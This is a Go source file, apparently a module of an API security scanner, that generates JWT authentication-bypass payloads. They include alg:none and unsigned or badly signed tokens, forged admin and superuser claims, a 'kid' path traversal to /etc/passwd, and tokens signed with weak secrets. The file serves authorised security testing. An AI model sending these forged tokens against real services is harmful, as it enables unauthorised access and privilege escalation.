package payloads

import (
	"encoding/base64"
	"strings"

	"github.com/su1ph3r/indago/pkg/types"
)

// JWTGenerator generates JWT manipulation attack payloads
type JWTGenerator struct{}

// NewJWTGenerator creates a new JWT manipulation payload generator
func NewJWTGenerator() *JWTGenerator {
	return &JWTGenerator{}
}

// Type returns the attack type
func (g *JWTGenerator) Type() string {
	return types.AttackJWT
}

// Generate generates JWT manipulation payloads for a parameter
func (g *JWTGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	var payloads []Payload

	// Target authentication-related parameters
	if !g.isJWTRelevant(param, endpoint) {
		return payloads
	}

	// Algorithm confusion payloads
	payloads = append(payloads, g.algorithmConfusionPayloads()...)

	// Signature bypass payloads
	payloads = append(payloads, g.signatureBypassPayloads()...)

	// Claim manipulation payloads
	payloads = append(payloads, g.claimManipulationPayloads()...)

	// Weak secret testing payloads
	payloads = append(payloads, g.weakSecretPayloads()...)

	return payloads
}

// isJWTRelevant checks if parameter might contain JWT tokens
func (g *JWTGenerator) isJWTRelevant(param *types.Parameter, endpoint types.Endpoint) bool {
	nameLower := strings.ToLower(param.Name)
	pathLower := strings.ToLower(endpoint.Path)

	// JWT-related parameter names
	jwtPatterns := []string{
		"token", "jwt", "auth", "authorization", "bearer",
		"access_token", "id_token", "refresh_token",
		"session", "credential", "key",
	}

	for _, pattern := range jwtPatterns {
		if strings.Contains(nameLower, pattern) {
			return true
		}
	}

	// JWT-related endpoints
	jwtEndpoints := []string{
		"/auth", "/login", "/oauth", "/token",
		"/verify", "/validate", "/session",
		"/api", "/protected", "/secure",
	}

	for _, ep := range jwtEndpoints {
		if strings.Contains(pathLower, ep) {
			return true
		}
	}

	// Check if parameter is in header position
	if param.In == "header" && (strings.Contains(nameLower, "auth") || nameLower == "authorization") {
		return true
	}

	return false
}

// algorithmConfusionPayloads generates algorithm confusion attack payloads
func (g *JWTGenerator) algorithmConfusionPayloads() []Payload {
	// alg:none attack - header: {"alg":"none","typ":"JWT"}
	algNoneHeader := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none","typ":"JWT"}`))
	// Payload with admin claim: {"sub":"admin","role":"admin","iat":1516239022}
	adminPayload := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"admin","role":"admin","iat":1516239022}`))

	// alg:None (case variation)
	algNoneUpperHeader := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"None","typ":"JWT"}`))

	// alg:NONE (all caps)
	algNoneAllCapsHeader := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"NONE","typ":"JWT"}`))

	return []Payload{
		{
			Value:       algNoneHeader + "." + adminPayload + ".",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT alg:none attack",
			Metadata:    map[string]string{"attack": "algorithm_confusion", "alg": "none"},
		},
		{
			Value:       algNoneUpperHeader + "." + adminPayload + ".",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT alg:None attack (case variation)",
			Metadata:    map[string]string{"attack": "algorithm_confusion", "alg": "None"},
		},
		{
			Value:       algNoneAllCapsHeader + "." + adminPayload + ".",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT alg:NONE attack (uppercase)",
			Metadata:    map[string]string{"attack": "algorithm_confusion", "alg": "NONE"},
		},
		{
			// HS256 with empty key
			Value:       base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`)) + "." + adminPayload + ".",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT HS256 with empty signature",
			Metadata:    map[string]string{"attack": "empty_signature"},
		},
	}
}

// signatureBypassPayloads generates signature bypass attack payloads
func (g *JWTGenerator) signatureBypassPayloads() []Payload {
	adminPayload := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"admin","role":"admin","iat":1516239022}`))
	hs256Header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`))

	return []Payload{
		{
			// Missing signature
			Value:       hs256Header + "." + adminPayload,
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT missing signature",
			Metadata:    map[string]string{"attack": "missing_signature"},
		},
		{
			// Null signature
			Value:       hs256Header + "." + adminPayload + ".null",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT null signature",
			Metadata:    map[string]string{"attack": "null_signature"},
		},
		{
			// Empty signature
			Value:       hs256Header + "." + adminPayload + ".",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT empty signature",
			Metadata:    map[string]string{"attack": "empty_signature"},
		},
		{
			// Invalid signature (random base64)
			Value:       hs256Header + "." + adminPayload + ".AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT invalid signature (zeros)",
			Metadata:    map[string]string{"attack": "invalid_signature"},
		},
		{
			// Truncated signature
			Value:       hs256Header + "." + adminPayload + ".abc",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT truncated signature",
			Metadata:    map[string]string{"attack": "truncated_signature"},
		},
	}
}

// claimManipulationPayloads generates claim manipulation attack payloads
func (g *JWTGenerator) claimManipulationPayloads() []Payload {
	hs256Header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`))

	// Various manipulated claims
	claims := []struct {
		payload string
		desc    string
	}{
		{`{"sub":"1","role":"admin","iat":1516239022}`, "JWT admin role claim"},
		{`{"sub":"admin","admin":true,"iat":1516239022}`, "JWT admin:true flag"},
		{`{"sub":"1","role":"superuser","iat":1516239022}`, "JWT superuser role"},
		{`{"sub":"1","is_admin":true,"iat":1516239022}`, "JWT is_admin:true"},
		{`{"sub":"1","scope":"admin read write","iat":1516239022}`, "JWT expanded scope"},
		{`{"sub":"1","exp":9999999999,"iat":1516239022}`, "JWT far future expiry"},
		{`{"sub":"1","aud":"admin-api","iat":1516239022}`, "JWT admin audience"},
		{`{"sub":"1","groups":["admin","root"],"iat":1516239022}`, "JWT admin groups"},
		{`{"sub":"0","role":"user","iat":1516239022}`, "JWT user ID 0 (system)"},
		{`{"sub":"1","role":"user","kid":"../../../../../../etc/passwd","iat":1516239022}`, "JWT header injection via kid"},
	}

	var payloads []Payload
	for _, c := range claims {
		payload := base64.RawURLEncoding.EncodeToString([]byte(c.payload))
		payloads = append(payloads, Payload{
			Value:       hs256Header + "." + payload + ".invalidsig",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: c.desc,
			Metadata:    map[string]string{"attack": "claim_manipulation"},
		})
	}

	return payloads
}

// weakSecretPayloads generates payloads for testing weak JWT secrets
func (g *JWTGenerator) weakSecretPayloads() []Payload {
	// These JWTs are signed with common weak secrets for testing
	// Server should reject them if using proper secrets
	return []Payload{
		{
			// Signed with "secret"
			Value:       "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.7h9opGKvKk1vTmEv-x-0Wy3KaW7RQXQ9f_XzlwXbGQM",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT signed with weak secret 'secret'",
			Metadata:    map[string]string{"attack": "weak_secret", "secret": "secret"},
		},
		{
			// Signed with "password"
			Value:       "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.vJfaWsJjq2yxs4FZ8EfLQ3Y_5O7A0fnEpCFz8N6RJHI",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT signed with weak secret 'password'",
			Metadata:    map[string]string{"attack": "weak_secret", "secret": "password"},
		},
		{
			// Signed with "123456"
			Value:       "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.PeKP-C8fJf-XC5_P8yNT6tN1E1F-Q4Dp5L8Q2T_Qx8s",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT signed with weak secret '123456'",
			Metadata:    map[string]string{"attack": "weak_secret", "secret": "123456"},
		},
		{
			// Signed with empty string
			Value:       "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.OPHUTcLVfJ6M1C0WuPm9HmQ1SJp2-8P6aM0Ei1P0TXU",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT signed with empty secret",
			Metadata:    map[string]string{"attack": "weak_secret", "secret": "empty"},
		},
		{
			// Signed with "key"
			Value:       "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.GdT-3JqeI9sBPmV7RK4Ol0I2LJ_r2O8x1_5vDWJ5H5g",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT signed with weak secret 'key'",
			Metadata:    map[string]string{"attack": "weak_secret", "secret": "key"},
		},
	}
}
